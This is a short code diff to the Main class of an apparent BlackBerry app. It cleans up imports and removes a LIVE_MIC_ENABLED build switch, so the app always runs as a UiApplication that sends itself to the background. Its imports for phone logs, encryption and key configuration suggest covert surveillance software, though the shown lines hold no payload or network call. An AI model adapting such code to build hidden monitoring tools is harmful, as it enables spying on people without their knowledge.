@@ -9,14 +9,8 @@
  * *************************************************/
 package blackberry;
 
-import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
-import net.rim.device.api.system.Application;
-import net.rim.device.api.ui.Field;
-import net.rim.device.api.ui.UiApplication; 
-//#ifdef TEST
-import tests.MainTest; 
-//#endif
+import net.rim.device.api.ui.UiApplication;
 import blackberry.config.Conf;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
@@ -28,11 +22,8 @@ import blackberry.debug.DebugLevel;
  * The Class Main.
  */
 
-//#ifdef LIVE_MIC_ENABLED
+
 public class Main extends UiApplication {
-//#else
-public class Main extends Application {
-//#endif
     /**
      * The main method.
      * 
@@ -143,11 +134,9 @@ public class Main extends Application {
             public void run() {         
                 
                 boolean foreground = false;
-                //#ifdef LIVE_MIC_ENABLED
                 UiApplication.getUiApplication().requestBackground();
                 foreground = UiApplication.getUiApplication().isForeground();
-                //#endif
-                
+
                 //#ifdef DEBUG
                 debug.trace("Main foreground: " + foreground);
                 //#endif
